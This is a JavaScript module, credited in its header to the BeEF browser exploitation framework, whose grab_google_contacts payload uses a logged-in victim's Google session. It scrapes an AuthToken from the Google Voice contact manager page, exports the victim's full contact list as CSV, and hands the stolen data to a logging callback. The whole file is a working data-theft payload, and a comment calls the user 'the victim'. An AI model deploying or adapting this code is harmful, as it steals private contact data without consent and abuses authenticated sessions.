// copied from BeEF             
// authors: ["Kos", "antisnatchor"]
// https://github.com/beefproject/beef/tree/master/modules/chrome_extensions/grab_google_contacts
(function() {
        var regContacts = '("AuthToken":{"Value":")(.*)("}}};)';
        function grabCSV(token){
            var csv = new XMLHttpRequest();
            csv.open("GET", "https://www.google.com/voice/c/b/X/data/export?groupToExport=%5EMine&exportType=ALL&out=GMAIL_CSV&tok="+token,false);
            csv.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
            csv.send();
            return csv.responseText
        }

        function toolContact(v) {
            var re = new RegExp(regContacts);
            var m = re.exec(v);
            if (m != null) {
                tmpCSV = grabCSV(m[2])
                params = "email=email&csv="+tmpCSV;
                setTimeout(function(){__logEval(tmpCSV);},100);
             }
        }

        function grabContacts(){
            var client = new XMLHttpRequest();
            client.open("GET", "https://www.google.com/voice/c/b/X/ui/ContactManager" ,false);
            client.setRequestHeader("Content-Charset", "ISO-8859-1,utf-8;q=0.7,*;q=0.3");
            client.send();
            if(client.status != 200){ // if the victim is not authenticated in Google, a 403 Forbidden error is received.
                setTimeout(function() {__logEval('not logged in');},100);
            }else{ //proceed
                toolContact(client.responseText);
            }
        }

        grabContacts();
})();
